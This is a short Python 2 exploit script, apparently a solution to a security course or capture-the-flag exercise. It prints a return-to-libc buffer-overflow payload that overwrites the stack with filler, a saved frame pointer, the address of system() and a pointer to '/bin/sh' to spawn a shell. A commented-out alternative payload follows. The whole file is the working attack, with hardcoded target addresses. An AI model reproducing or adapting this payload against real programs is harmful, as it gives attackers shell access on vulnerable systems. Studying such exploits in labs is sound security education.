string = "/bin/sh"
ebp = "\xfc\xe2\xfe\xbf" # anynuumber but reasonable  0xbffee2fc as integer
sys = "\x30\xa0\x04\x08"
straddr = "\x08\xe3\xfe\xbf"

print "a"*18 +ebp+sys+'anyt'+straddr+string

#haoyuan9
#from shellcode import shellcode
#print "\x01"*18+"\xc8\x7d\xfe\xbf"+"\x30\xa0\x04\x08"+"\x5e\x8f\x04\x08"+"\xe5\x61\x0c\x08"